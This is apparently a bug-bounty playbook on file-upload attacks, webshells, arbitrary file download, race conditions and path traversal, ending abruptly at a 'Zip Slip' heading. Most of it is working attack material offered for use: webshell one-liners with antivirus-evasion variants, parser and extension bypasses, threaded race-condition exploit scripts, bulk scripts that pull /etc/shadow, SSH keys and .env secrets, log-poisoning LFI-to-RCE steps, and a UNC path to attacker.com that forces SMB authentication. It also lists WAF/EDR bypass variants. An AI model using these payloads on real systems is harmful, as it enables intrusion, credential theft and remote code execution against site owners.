# File Upload (Arbitrary File Write / Webshell)

> Perspective: black-box; the goal is to upload a parsable file / trigger a parsing vulnerability / get a shell

## 1. In one sentence

File upload = storing untrusted bytes on the server + the backend being able to parse them.
You must break through both layers: (a) **bypass validation**, (b) **trigger parsing**.
SRC value: success = direct RCE, P0; failure = restricted upload, P2/P3.

---

## 2. High-frequency entry points

### 2.1 Upload-point distribution (statistics over the top 50 cases)

| Type | Share | Path characteristics |
|------|------|---------|
| Rich-text editor | 42% | `/fckeditor/`, `/ewebeditor/`, `/ueditor/`, `/kindeditor/` |
| Avatar | 18% | `/upload/avatar/`, `/member/uploadfile/` |
| Attachment / document | 15% | `/uploads/`, `/attachment/` |
| Backend feature | 12% | `/admin/upload/`, `/system/upload/` |
| Business | 8% | `/apply/`, `/submit/`, `/import/` |
| Import | 5% | `/import/`, `/excelUpload/` |

### 2.2 Editor path quick reference

| Editor | Test path |
|--------|---------|
| FCKeditor | `/FCKeditor/editor/filemanager/browser/default/connectors/test.html` |
| FCKeditor | `/FCKeditor/editor/filemanager/browser/default/browser.html` |
| FCKeditor | `/FCKeditor/editor/filemanager/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/` |
| eWebEditor | `/ewebeditor/admin/default.jsp` |
| eWebEditor | `/eWebEditor/admin/Login.aspx` |
| UEditor | `/ueditor/controller.jsp?action=config` |
| UEditor | `/ueditor/php/controller.php?action=config` |
| KindEditor | `/kindeditor/php/file_manager_json.php` |
| CKEditor | `/ckfinder/userfiles/files/` |
| TinyMCE | `/plugins/imagemanager/upload.php` |

### 2.3 High-risk CMS paths

| CMS / system | Upload path | Condition |
|-----------|---------|------|
| Wanhu OA ezOffice | `/defaultroot/dragpage/upload.jsp` | truncation bypass |
| Yonyou collaboration | `/oaerp/ui/sync/excelUpload.jsp` | bypass JS |
| Kingdee GSiS | `/kdgs/core/upload/upload.jsp` | registered user |
| Finecms | `/member/controllers/Account.php` | registered user + race |
| PHPEMS | `/app/document/api.php` | no suffix check |

---

## 3. Probing techniques

### 3.1 Client-side JS validation bypass

```
1. Disable browser JS / send packets directly with Postman / curl
2. Intercept the upload request with Burp, modify filename / content-type
3. Modify the frontend DOM: remove accept="image/*"
```

### 3.2 Extension bypass quick table

| Technique | PHP | ASP/X | JSP |
|------|-----|-------|-----|
| Casing | `.Php`, `.pHp` | `.Asp`, `.aSp` | `.Jsp` |
| Double-write | `.pphphp` | `.asaspp` | `.jsjspp` |
| Special suffix | `.php3`, `.php5`, `.phtml`, `.phar`, `.pht` | `.asa`, `.cer`, `.cdx`, `.aspx` | `.jspx`, `.jspa`, `.jspi`, `.jsw` |
| Space / dot | `.php ` or `.php.` | `.asp ` | `.jsp.` |
| `::$DATA` | - | `.asp::$DATA` | - |
| `%00` truncation | `.php%00.jpg` | `.asp%00.jpg` | `.jsp%00.jpg` |
| `;` truncation | - | `.asp;.jpg` (IIS6) | - |
| `/` truncation | - | `.asp/.jpg` | - |

### 3.3 Content-Type modification

```
Original: application/octet-stream
Change to: image/jpeg / image/png / image/gif / application/pdf
```

Capture the packet and change the `Content-Type:` line in the `multipart/form-data`.

### 3.4 File-header / content bypass

```bash
# Image-embedded shell (GIF)
echo -ne "GIF89a\n<?php @eval(\$_POST['c']);?>" > shell.gif
mv shell.gif shell.php

# Image-embedded shell (PNG, binary header + PHP hidden in a comment segment)
copy /b real.png + shell.php fake.png   # Windows
cat real.jpg shell.php > fake.jpg        # Linux

# EXIF injection (edit EXIF Comment with GIMP)
exiftool -Comment="<?php system(\$_GET['cmd']);?>" image.jpg
```

### 3.5 Webshell content AV evasion

| Type | Example |
|------|------|
| **PHP variable function** | `<?php $a='ass'.'ert'; $a($_POST['c']);?>` |
| **PHP callback** | `<?php array_map('assert', $_POST);?>` |
| **PHP dynamic construction** | `<?php $f = create_function('', $_POST['x']); $f();?>` |
| **PHP eval alternative** | `preg_replace('/.*/e', $_POST['c'], '');` (PHP < 7) |
| **JSP** | `<%Runtime.getRuntime().exec(request.getParameter("c"));%>` |
| **JSPX** | XML format, missed when the WAF detects `.jsp` |
| **ASP** | `<%execute(request("c"))%>` |
| **ASPX** | `<%@ Page Language="C#"%><%System.Diagnostics.Process.Start(...)%>` |

### 3.6 Parsing-vulnerability triggering

| Server | Vulnerability | Payload |
|--------|------|---------|
| **IIS 6.0 directory** | `/shell.asp/1.jpg` → treated as ASP | upload to the `/shell.asp/` folder |
| **IIS 6.0 file** | `shell.asp;.jpg` → treated as ASP | name it directly |
| **IIS 7.x** | `shell.jpg/.php` → treated as PHP (fix_pathinfo=1) | URL concatenation |
| **Apache multiple suffixes** | `shell.php.xxx` → treated as PHP (parsed right-to-left) | name it `shell.php.xxx` |
| **Apache .htaccess** | `AddType application/x-httpd-php .jpg` | upload .htaccess then upload .jpg |
| **Apache CVE-2017-15715** | `shell.php\x0a` → treated as PHP | append `\n` to the filename |
| **Nginx fix_pathinfo** | `shell.jpg/x.php` → treated as PHP | URL path concatenation |
| **Nginx CVE-2013-4547** | `shell.jpg \0.php` | null byte |
| **Tomcat CVE-2017-12615** | PUT `/shell.jsp/` | PUT method |

### 3.7 Path acquisition / naming rules

| Method | Description |
|------|------|
| Response returns it directly | `{"url":"/uploads/2024/abc.jpg"}` |
| Preview feature | page displays it after upload / editor preview |
| Editor directory traversal | `?Command=GetFoldersAndFiles&CurrentFolder=/../` |
| Timestamp brute force | `20140829221136jsp.jsp`, second-level deviation ±60s |
| Combined with .git leak | back out the naming-rule code |

---

## 4. Bypass matrix

| Protection | Bypass |
|------|------|
| Client-side JS | disable JS / capture and modify packet |
| Blacklist suffix | casing, double-write, special suffix |
| Allowlist | `%00` (old), parsing vulnerability, `.jsp/x.jsp.png` |
| Content-Type | change to `image/jpeg` |
| File header | `GIF89a` header + script |
| Content static scanning | variable function / encoding / concatenation |
| Size limit | Chunked / segmented upload |
| Re-rendering | EXIF / IDAT / GIF comment segment / PNG tEXt |
| Path not returned after upload | editor traversal / timestamp brute force / combined with source leak |
| Delete time window | race: multi-threaded upload + immediate access (Finecms vulnerability) |
| Non-script directory | `filename=../../webroot/shell.php` path traversal |

---

## 5. Exploitation for escalation / lateral

```
Upload webshell.jsp / shell.php
  → access /uploads/shell.php?c=id
  → reverse shell (do not do in SRC)
  → privilege escalation (do not do)
  → lateral movement (do not do)

→ When reporting to SRC, stop at "shell.php?c=id returns uid=..."
  Name the written file poc-{date}-{nick}.jsp, and immediately state in the report "please clean up"
```

---

## 6. Real-case fingerprints

| Case ID | Key technique | Target |
|--------|---------|------|
| wooyun-2015-0108457 | bypass via HTTP Response modification | transportation system |
| wooyun-2015-0135258 | FCKeditor editor vulnerability | public transit |
| wooyun-2016-0167456 | `%00` truncation | financial system |
| wooyun-2014-064031 | Wanhu OA truncation bypass | Wanhu ezOffice |
| wooyun-2015-090186 | eWebEditor | government procurement |
| wooyun-2014-063369 | Finecms race condition | Finecms |
| wooyun-2015-0126541 | Wanhu ezOffice architecture analysis | Wanhu |
| wooyun-2015-0149146 | JSPX bypass | insurance system |
| wooyun-2015-0158311 | Nginx parsing vulnerability | portal site |
| wooyun-2016-0212792 | extension bypass | telecom carrier |

Common fingerprints:

- Upload response contains `path`, `url`, `filename` fields → path known
- Site `/uploads/`, `/upload/`, `/files/` directly allows directory listing → browse
- IIS 6.0 + `.asp;.jpg` → classic parsing vulnerability
- Apache + uploading .htaccess is not blocked → change parsing rules
- Nginx + URL `x.jpg/y.php` returns 200 → fix_pathinfo

---

## 7. Reproduction / evidence essentials

### 7.1 Report must-haves

1. **Upload request packet** (with the full multipart)
2. **Upload response** (with the returned file URL, if any)
3. **Request + response for accessing the webshell** (proving it executes)
4. **Output of the executed command** (`id`, with intranet info redacted)
5. **A prompt to clean up the PoC file after fixing**

### 7.2 Report PoC template

```http
POST /upload.jsp HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=xxx

--xxx
Content-Disposition: form-data; name="file"; filename="poc-2025-05-09.jsp"
Content-Type: image/jpeg

<%out.println(Runtime.getRuntime().exec("id").getInputStream());%>
--xxx--

# Response
{"url":"/uploads/20250509142312poc-2025-05-09.jsp"}

# Validation
GET /uploads/20250509142312poc-2025-05-09.jsp
→ uid=1001(tomcat) gid=1001(tomcat)
```

### 7.3 CVSS

```
Unauthenticated arbitrary file upload → RCE  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8
Post-auth arbitrary file upload → RCE  CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8
Restricted upload (prefix bypass only) CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N = 6.5
```

### 7.4 Impact section

```
Via the /upload.jsp endpoint, an attacker can bypass extension validation to upload a .jsp file,
and combined with Tomcat's default parsing behavior obtain RCE. The attacker can:
1. Read the web application source code and database connection config;
2. Move laterally into the intranet (the application server can usually access DB / Redis);
3. Persist without a fix.

During testing the uploaded filename was poc-2025-05-09.jsp, and the command executed was only id;
please delete /uploads/20250509142312poc-2025-05-09.jsp after confirming the vulnerability.
```

---

## Related MCP tools

In practice, jshookmcp can be invoked for automation. **The default `search` profile does not pre-load tools; before invoking, first activate with `mcp__jshook__activate_tools <tool_name>`** (see [`../tools/mcp-jshook.md`](../tools/mcp-jshook.md) §recommended profile).

| Tool | Domain | When to invoke |
|---|---|---|
| `mcp__jshook__binary_encode` + `mcp__jshook__binary_decode` | encoding | craft polyglot (image header + script tail) / base64 / hex conversion |
| `mcp__jshook__ast_transform_apply` + `mcp__jshook__ast_transform_preview` | transform | modify magic bytes / change polyglot structure / change MIME-embedded semantics |
| `mcp__jshook__http_plain_request` | network | custom multipart boundary / modify Content-Disposition header to bypass filtering |
| `mcp__jshook__network_replay_request` | network | replay the upload request and modify filename / Content-Type |
| `mcp__jshook__protobuf_decode_raw` | encoding | blindly decode metadata when the upload response is protobuf |

Full mapping: [`../tools/mcp-jshook.md`](../tools/mcp-jshook.md)

## 8. Things not to do

- **Forbidden**: uploading a real webshell (with a backdoor, encrypted channel). **Only use the simplest jsp/php**: `<%=Runtime.getRuntime().exec("id").getInputStream()%>`.
- **Forbidden**: performing privilege escalation, lateral movement, or planting persistence after upload.
- **Forbidden**: uploading content that others could mistakenly access (phishing pages, external-link scripts).
- **Forbidden**: leaving a webshell without cleanup. **Proactively** inform the file path in the report and request deletion.
- **Forbidden**: testing overwriting an existing legitimate file (e.g. `index.jsp`) — may affect the business.
- **Restriction**: stop after uploading 1–3 PoC files; do not upload in bulk.
- **In the report**: state "the PoC filename is X, please delete it after fixing."

## H1 real cases

_A total of 8 disclosed HackerOne High/Critical reports hit this category, sorted by (bounty + votes×100), taking the Top 12_

| Severity | $ | Program | Title (click for the original report) | Summary |
|---|--:|---|---|---|
| High | 1500 usd | Slack | [Tricking the "Create snippet" feature into displaying the wrong filetype can lead to RCE on Slack…](https://hackerone.com/reports/833080) | Tricking the "Create snippet" feature into displaying the wrong filetype can lead to RCE on Slack users |
| Critical | 5000 usd | Aiven Ltd | [[Kafka Connect] [JdbcSinkConnector][HttpSinkConnector] RCE by leveraging file upload via SQLite J…](https://hackerone.com/reports/1547877) | Summary: The Aiven JDBC sink includes the SQLite JDBC Driver. This JDBC driver can be used to upload SQLite database files onto… |
| Critical | — | Mars | [Unrestricted File Upload at ██████████](https://hackerone.com/reports/2357778) | Unrestricted File Upload at ██████████ |
| High | 4660 usd | Internet Bug Bounty | [Cargo not respecting umask when extracting crate archives](https://hackerone.com/reports/2094785) | Cargo did not properly protect files in the cargo registry. When an archive contained files which were marked as globally write… |
| High | — | U.S. Dept Of Defense | [Unrestricted File Upload Leads to XSS & Potential RCE](https://hackerone.com/reports/900179) | Summary:** Unrestricted file upload at████████/request?openform. When the user wants to upload a file the app allows the user t… |
| High | — | WordPress | [[Buddypress] Arbitrary File Deletion through bp_avatar_set](https://hackerone.com/reports/183568) | Hi, The bp_avatar_set action in BuddyPress when cropping avatars allows an attacker to arbitrarily delete a file the webserver … |
| High | — | Node.js third-party modules | [Arbitrary File Write Through Archive Extraction](https://hackerone.com/reports/362118) | I would like to report arbitrary file write vulnerability in adm-zip module It allows attackers to write arbitrary files when a… |
| High | — | U.S. Dept Of Defense | [Stored XSS on ████████helpdesk](https://hackerone.com/reports/901799) | Stored XSS on ████████helpdesk |

**Weakness distribution for hits in this category:**

- Unrestricted Upload of File with Dangerous Type: 5 entries
- Uncategorized → manually classified: 3 entries

## Payload library

_7 structured web payloads, including full attack chains + WAF/EDR bypass variants_

### File upload bypass  `file-upload-bypass`
File-upload restriction bypass techniques
Sub-category: **file upload** · tags: `upload` `bypass` `webshell`

**Prerequisites:** the target has a file-upload feature; upload restrictions exist

**Attack chain:**

**1. Extension bypass**
_Extension bypass (including casing, double suffix)_
```
shell.php.jpg
shell.php%00.jpg
shell.phtml
shell.php5
shell.phar
shell.PhP
```

**2. Content-Type**
_Modify Content-Type_
```
Content-Type: image/jpeg
Content-Type: image/png
```

**3. Image-embedded shell**  _[windows]_
_Making an image-embedded shell_
```
copy normal.jpg/b + shell.php/a webshell.jpg
```

**4. Space bypass**  _[windows]_
_Trailing space in the filename_
```
# Space/null-character bypass of suffix detection:
# 1. Trailing space in the filename (Windows characteristic, automatically stripped on save):
filename="shell.php "

# 2. %20-encoded space:
Content-Disposition: form-data; name="file"; filename="shell.php%20"

# 3. Null-byte truncation (PHP<5.3.4):
filename="shell.php%00.jpg"
filename="shell.php .jpg"

# 4. Tab injection:
filename="shell.php%09.jpg"

# In Burp: intercept the upload request → manually add a space/null byte after .php in the filename
```

**5. Dot bypass**  _[windows]_
_Trailing dot in the filename_
```
# Dot/special-character bypass:
# 1. Trailing dot (Windows automatically strips trailing dots):
filename="shell.php."
filename="shell.php..."

# 2. Dot + space combination:
filename="shell.php. "
filename="shell.php .jpg"

# 3. Semicolon truncation (IIS 6.0):
filename="shell.asp;.jpg"
filename="test.asp;x.jpg"

# 4. :: concept (not executed, explanation only)
# Windows NTFS stream: shell.php::DATA_STREAM

# 5. Newline injection:
filename="shell.ph
p"

# Test: after upload, access the URL to confirm whether the file is parsed as PHP
curl "http://target.com/uploads/shell.php." -v
```

**6. NTFS stream**  _[windows]_
_NTFS ADS bypass_
```
# Windows NTFS alternate data stream bypass:
# 1. Standard NTFS ADS bypass:
filename="shell.php::DATA"
# Windows automatically ignores the ::DATA suffix, the file is saved as shell.php

# 2. Other ADS variants:
filename="shell.php::INDEX_ALLOCATION"
filename="shell.php:evil.php"
filename="shell.php:evil.txt:DATA"

# 3. In Burp:
# Intercept the upload request
# Change filename to: shell.php::DATA
# Send the request

# 4. Verify whether the file uploaded:
curl "http://target.com/uploads/shell.php" -v
curl "http://target.com/uploads/shell.php::DATA" -v

# Note: only effective in a Windows (IIS/NTFS) environment; Linux lacks this characteristic
```

**7. Double-write bypass**
_Double-write extension_
```
# Double-write suffix bypass (when the server only strips the sensitive suffix once):
# 1. PHP double-write:
filename="shell.pphphp"    # after stripping php, shell.php remains
filename="shell.pHPhp"     # mixed-case double-write
filename="shell.phphpp"    # double-write in a different position

# 2. ASP double-write:
filename="shell.asaspp"    # after stripping asp, shell.asp remains
filename="shell.aaspsp"

# 3. JSP double-write:
filename="shell.jjspsp"

# 4. Multi-layer nesting:
filename="shell.phpphpphp" # still .php after two strips

# 5. Combined with casing:
filename="shell.PhPhPp"

# Verify: after upload, confirm the actual filename saved by the server
curl -I "http://target.com/uploads/shell.php"
```

**WAF/EDR bypass variants:**

**1. Double extension and NTFS data-stream bypass**
_Use a double extension to fool file-type detection, Windows NTFS alternate data stream (::$DATA) to bypass extension checks, and special characters (space, dot, null byte) to truncate the filename_
```
# Double extension:
shell.php.jpg
shell.jpg.php
shell.php.test
shell.php%00.jpg

# NTFS alternate data stream (Windows):
shell.php::$DATA
shell.php::$DATA.jpg
shell.asp;.jpg

# Special characters:
shell.php%20
shell.php.
shell.php....
shell.php .jpg
```

**2. Content-Disposition manipulation and chunked upload**
_Bypass WAF stream detection via Content-Disposition header filename encoding variants and Chunked transfer encoding, and access a malicious file inside an archive using the PHP wrapper protocol_
```
# Content-Disposition field-name wrapping bypass:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Disposition: form-data; name="file"; filename*=UTF-8''shell.php
Content-Disposition: form-data; name="file"; filename="shell.php"

# Chunked transfer encoding:
Transfer-Encoding: chunked

# PHP Wrapper upload:
zip://uploads/avatar.jpg%23shell
phar://uploads/avatar.jpg/shell.php

# Race condition:
# Access immediately after upload before the file is deleted
```

---

### Arbitrary file download  `file-download`
Use path-control flaws in the file-download feature to download arbitrary sensitive files on the server
Sub-category: **download** · tags: `file-download` `lfi` `leak`

**Prerequisites:** the target has a file-download feature; the file-path parameter is controllable; the server does not strictly filter the path

**Attack chain:**

**1. Identify the file-download endpoint**
_Identify the target's file-download endpoint and parameter names_
```
# Common file-download URL patterns:
curl -v "http://target.com/download?file=report.pdf"
curl -v "http://target.com/download.php?path=uploads/doc.pdf"
curl -v "http://target.com/api/file/read?name=image.jpg"
curl -v "http://target.com/export?filename=data.csv"
curl -v "http://target.com/attachment/get/123"
```

**2. Path traversal to download sensitive files**
_Use path-traversal sequences to read sensitive system and application config files outside the web root_
```
# Linux sensitive files:
curl "http://target.com/download?file=../../../etc/passwd"
curl "http://target.com/download?file=....//....//....//etc/shadow"
curl "http://target.com/download?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd"
curl "http://target.com/download?file=..%252f..%252f..%252fetc/passwd"

# Windows sensitive files:
curl "http://target.com/download?file=......windowswin.ini"
curl "http://target.com/download?file=......windowssystem32configSAM"

# Web application config files:
curl "http://target.com/download?file=../WEB-INF/web.xml"
curl "http://target.com/download?file=../application.properties"
curl "http://target.com/download?file=../.env"
curl "http://target.com/download?file=../config/database.yml"
```

**3. Download source code and database config**  _[linux]_
_Targetedly download application source code and database config files to obtain database credentials_
```
# Java application key files:
curl "http://target.com/download?file=../../WEB-INF/web.xml" -o web.xml
curl "http://target.com/download?file=../../WEB-INF/classes/application.yml" -o app.yml
curl "http://target.com/download?file=../../WEB-INF/classes/db.properties" -o db.properties

# PHP application:
curl "http://target.com/download?file=../../config.php" -o config.php
curl "http://target.com/download?file=../../.env" -o .env

# Node.js application:
curl "http://target.com/download?file=../../package.json" -o package.json
curl "http://target.com/download?file=../../.env" -o .env

# Extract database credentials:
grep -iE "password|passwd|pwd|secret|key|db_|database|mysql|postgres" *.yml *.xml *.properties *.env 2>/dev/null
```

**4. Automated bulk sensitive-file probing**  _[linux]_
_Automatically probe and download multiple common sensitive files_
```
#!/bin/bash
# Bulk-test common sensitive-file paths
BASE="http://target.com/download?file="
FILES=(
  "../../../etc/passwd" "../../../etc/shadow" "../../../etc/hosts"
  "../../../proc/self/environ" "../../../proc/self/cmdline"
  "../../WEB-INF/web.xml" "../../WEB-INF/classes/application.properties"
  "../../.env" "../../config.php" "../../web.config"
  "../../../root/.ssh/id_rsa" "../../../root/.bash_history"
  "../../../var/log/apache2/access.log"
)

for f in "${FILES[@]}"; do
  resp=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" "${BASE}${f}")
  code=$(echo $resp | cut -d: -f1)
  size=$(echo $resp | cut -d: -f2)
  if [ "$code" == "200" ] && [ "$size" -gt 0 ]; then
    echo "[+] FOUND: $f (HTTP $code, $size bytes)"
    curl -s "${BASE}${f}" -o "loot_$(echo $f | tr '/' '_')"
  fi
done
```

**WAF/EDR bypass variants:**

**1. Double URL encoding bypass**
_Use double URL encoding, Unicode overlong encoding, etc. to bypass the WAF's detection of path-traversal characters_
```
# Double-encoded ../
?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd
?file=%252e%252e%255cetc%255cpasswd

# Unicode encoding variants
?file=..%c0%af..%c0%afetc/passwd
?file=..%ef%bc%8f..%ef%bc%8fetc/passwd

# Mixed encoding
?file=..%2f..%2f..%2fetc%2fpasswd
?file=....//....//etc/passwd
```

**2. Parameter-name substitution and path manipulation**
_Try different file-parameter names and URL protocol wrappers to bypass WAF rules_
```
# Common file-download parameter-name fuzzing
?path=../../etc/passwd
?filepath=../../etc/passwd
?filename=../../etc/passwd
?doc=../../etc/passwd
?download=../../etc/passwd
?src=../../etc/passwd
?url=file:///etc/passwd

# Using URL protocols
?file=file:///etc/passwd
?file=php://filter/convert.base64-encode/resource=config.php
```

**3. Null-byte truncation and suffix bypass**
_Use null-byte truncation, filesystem path-length limits, and special-character obfuscation to bypass file-path checks_
```
# Null-byte truncation (PHP < 5.3.4)
?file=../../etc/passwd%00
?file=../../etc/passwd%00.jpg

# Path truncation (Windows long path)
?file=../../etc/passwd..............................................................

# Dot-slash obfuscation
?file=....//....//....//etc/passwd
?file=..;/..;/..;/etc/passwd
?file=..\..\..\etc\passwd
```

---

### Race condition  `file-competition`
Exploit a race condition (Race Condition) in the file upload/processing flow to perform malicious operations within the time window between the security check and the file's use
Sub-category: **Race Condition** · tags: `race-condition` `file-upload`

**Prerequisites:** the target has a file-upload feature; the server processing flow uploads first then checks; you can access the uploaded file with high concurrency; you understand the temp-file storage path

**Attack chain:**

**1. Identify the race-condition window**  _[linux]_
_Analyze the file-upload processing flow and identify the time window before and after the security check_
```
# Analyze the upload flow:
# 1. File uploaded to a temp directory
# 2. Backend performs a security check (file type/content)
# 3. If the check passes it is kept, otherwise it is deleted
# There is a time window between step 1 and step 3

# Test the upload response time (to determine whether there is a check delay)
for i in $(seq 1 5); do
  time curl -s -o /dev/null -w "%{http_code}" -F "file=@test.jpg" "http://target.com/upload"
done
```

**2. Race-condition exploitation - concurrent upload and access**  _[linux]_
_Access and execute the malicious file within the time window after upload before the security check deletes it_
```
# Malicious PHP file (shell.php):
# <?php system($_GET["cmd"]); ?>

# Method 1: use two terminals for concurrent operations
# Terminal 1 - continuous upload:
while true; do
  curl -s -F "file=@shell.php" "http://target.com/upload" &
done

# Terminal 2 - continuous access:
while true; do
  result=$(curl -s "http://target.com/uploads/shell.php?cmd=id")
  if echo "$result" | grep -q "uid="; then
    echo "[+] RCE SUCCESS: $result"
    break
  fi
done
```

**3. Python concurrent race exploitation script**
_Multi-threaded concurrent upload and access to increase the race-condition exploitation success rate_
```
import requests
import threading
import time

TARGET = "http://target.com"
UPLOAD_URL = f"{TARGET}/upload"
SHELL_URL = f"{TARGET}/uploads/shell.php?cmd=id"

def upload_loop():
    files = {"file": ("shell.php", "<?php system($_GET['cmd']); ?>", "image/jpeg")}
    while not stop_event.is_set():
        try:
            requests.post(UPLOAD_URL, files=files, timeout=2)
        except: pass

def access_loop():
    while not stop_event.is_set():
        try:
            r = requests.get(SHELL_URL, timeout=1)
            if "uid=" in r.text:
                print(f"[+] RCE! Response: {r.text[:200]}")
                stop_event.set()
                return
        except: pass

stop_event = threading.Event()
threads = []
for _ in range(10):
    threads.append(threading.Thread(target=upload_loop))
for _ in range(20):
    threads.append(threading.Thread(target=access_loop))
for t in threads: t.start()
time.sleep(60)
stop_event.set()
for t in threads: t.join()
```

**4. .htaccess race write**  _[linux]_
_Use a race upload of .htaccess to make Apache parse and execute an image file as PHP_
```
# If you can upload a .htaccess file (even if it will be deleted):
# .htaccess content:
AddType application/x-httpd-php .jpg

# Race exploitation:
# 1. First upload a .jpg file containing PHP code normally
curl -F "file=@shell.jpg" "http://target.com/upload"

# 2. Access the .jpg within the time window while .htaccess exists
while true; do
  curl -s -F "file=@.htaccess" "http://target.com/upload" &
  result=$(curl -s "http://target.com/uploads/shell.jpg?cmd=id")
  [ -n "$result" ] && echo "[+] $result" && break
done
```

**WAF/EDR bypass variants:**

**1. Concurrent upload race exploitation**
_Access the uploaded file within the time window between the file check and deletion via a large number of concurrent requests_
```
# Python concurrent race upload
import threading, requests

def upload_shell():
    files = {'file': ('test.php', '<?php echo "security_check"; ?>', 'image/jpeg')}
    requests.post('http://target/upload', files=files)

def access_shell():
    r = requests.get('http://target/uploads/test.php')
    if 'security_check' in r.text:
        print('[+] Race won!')

for i in range(100):
    t1 = threading.Thread(target=upload_shell)
    t2 = threading.Thread(target=access_shell)
    t1.start(); t2.start()
```

**2. .htaccess race overwrite**
_Use a race condition to write .htaccess during the check gap so an image file is parsed as PHP_
```
# Race-condition upload of .htaccess
import threading, requests

def upload_htaccess():
    files = {'file': ('.htaccess', 'AddType application/x-httpd-php .jpg', 'text/plain')}
    requests.post('http://target/upload', files=files)

def upload_payload():
    files = {'file': ('test.jpg', '<?php echo "security_check"; ?>', 'image/jpeg')}
    requests.post('http://target/upload', files=files)

for i in range(50):
    t1 = threading.Thread(target=upload_htaccess)
    t2 = threading.Thread(target=upload_payload)
    t1.start(); t2.start()
```

**3. Chunked upload time window**
_Extend the server processing time via chunked transfer encoding (chunked) to enlarge the race exploitation window_
```
# Use chunked transfer to extend the upload time window
import socket, time

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('target', 80))

headers = (
    "POST /upload HTTP/1.1\r\n"
    "Host: target\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Content-Type: multipart/form-data; boundary=abc\r\n\r\n"
)
sock.send(headers.encode())

# Slowly send chunked data to extend the file's existence time
chunks = ["5\r\nhello\r\n", "5\r\nworld\r\n", "0\r\n\r\n"]
for chunk in chunks:
    sock.send(chunk.encode())
    time.sleep(0.5)
```

---

### Path traversal  `file-traversal`
Use path-traversal (../) sequences to break through the directory restriction on file access, reading or writing arbitrary files outside the web root
Sub-category: **Traversal** · tags: `traversal` `file`

**Prerequisites:** the target has a file-read/inclusion feature; the file-path parameter is controllable; the server does not filter the path strictly

**Attack chain:**

**1. Basic path-traversal test**  _[linux]_
_Test basic path traversal and the required directory-jump depth_
```
# Basic traversal:
curl "http://target.com/file?path=../../../../etc/passwd"
curl "http://target.com/image?name=../../../../etc/passwd"

# Test traversal depth (usually 3-10 levels is enough to reach the root):
for i in $(seq 1 10); do
  traversal=$(printf "../%.0s" $(seq 1 $i))
  resp=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" "http://target.com/file?path=${traversal}etc/passwd")
  echo "Depth $i: $resp"
done
```

**2. Encoding bypass of path filtering**
_Use various encoding methods to bypass the path-traversal filtering mechanism_
```
# URL encoding:
curl "http://target.com/file?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"

# Double URL encoding:
curl "http://target.com/file?path=%252e%252e%252f%252e%252e%252fetc/passwd"

# Unicode encoding:
curl "http://target.com/file?path=..%c0%afetc/passwd"
curl "http://target.com/file?path=..%ef%bc%8fetc/passwd"

# Null-byte truncation (PHP<5.3.4):
curl "http://target.com/file?path=../../../../etc/passwd%00.jpg"

# Double-write bypass (server strips ../ once):
curl "http://target.com/file?path=....//....//....//etc/passwd"

# Backslash (Windows):
curl "http://target.com/file?path=......windowswin.ini"

# Mixed slashes:
curl "http://target.com/file?path=../../../../etc/passwd"
```

**3. Windows-specific path traversal**  _[windows]_
_Windows-specific path-traversal techniques and sensitive files_
```
# UNC path (may trigger SMB authentication):
curl "http://target.com/file?path=\attacker.comshare	est"

# Windows sensitive files:
curl "http://target.com/file?path=C:Windowswin.ini"
curl "http://target.com/file?path=C:WindowsSystem32configSAM"
curl "http://target.com/file?path=C:inetpubwwwrootweb.config"
curl "http://target.com/file?path=C:UsersAdministrator.sshid_rsa"

# IIS short-filename enumeration:
curl -v "http://target.com/file?path=C:inetpubwwwrootWEB~1.CON"
```

**4. LFI to RCE escalation**  _[linux]_
_Escalate file inclusion (LFI) to remote code execution (RCE)_
```
# 1. Log-file inclusion (Log Poisoning):
curl "http://target.com/" -A "<?php system($_GET['cmd']); ?>"
curl "http://target.com/file?path=../../../var/log/apache2/access.log&cmd=id"

# 2. /proc/self/environ inclusion:
curl "http://target.com/file?path=../../../proc/self/environ" -A "<?php system($_GET['c']); ?>"

# 3. PHP Session file inclusion:
# First write the payload into the session (e.g. the username field)
# Then include the session file:
curl "http://target.com/file?path=../../../tmp/sess_SESSION_ID"

# 4. PHP Filter to read source code:
curl "http://target.com/file?path=php://filter/convert.base64-encode/resource=config.php"
```

**WAF/EDR bypass variants:**

**1. Encoding bypass of path filtering**
_Bypass the WAF's path-detection rules via double URL encoding, Unicode overlong encoding, and non-standard UTF-8 encoding_
```
# Double URL encoding
..%252f..%252f..%252fetc%252fpasswd

# Unicode/UTF-8 overlong encoding
..%c0%af..%c0%afetc/passwd
..%e0%80%af..%e0%80%afetc/passwd

# 16-bit Unicode encoding
..%u002f..%u002fetc/passwd
..%u2215..%u2215etc/passwd

# URL-encoding mixed
%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e%5c%2e%2e%5cetc%5cpasswd
```

**2. Path-normalization difference exploitation**
_Use the differences in how different middleware (IIS/Apache/Nginx/Tomcat) parses paths to bypass security restrictions_
```
# Backslash substitution (IIS/Windows)
..\..\..\etc\passwd
..\\..\\..\\windows\\win.ini

# Dot-slash variants
....//....//....//etc/passwd
..;/..;/..;/etc/passwd
..%00/..%00/etc/passwd

# Java/Tomcat special handling
/..;/..;/..;/etc/passwd
/.;/../.;/../etc/passwd

# Nginx path folding
/static/../../../etc/passwd
/images/..%2f..%2f..%2fetc/passwd
```

**3. Null-byte and path-truncation bypass**
_Use null-byte injection, filesystem path-length limits, and Windows special-filename handling to bypass_
```
# Null-byte truncation
../../etc/passwd%00.png
../../etc/passwd\x00.jpg

# Windows short filename
..\..\..\WINDOW~1\system32\drivers\etc\hosts

# Overlong path truncation (PHP < 5.3)
../../etc/passwd/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././

# Dot-space-dot truncation (Windows)
../../windows/win.ini. . .
```

---

### Zip Slip  `file-zip-slip`
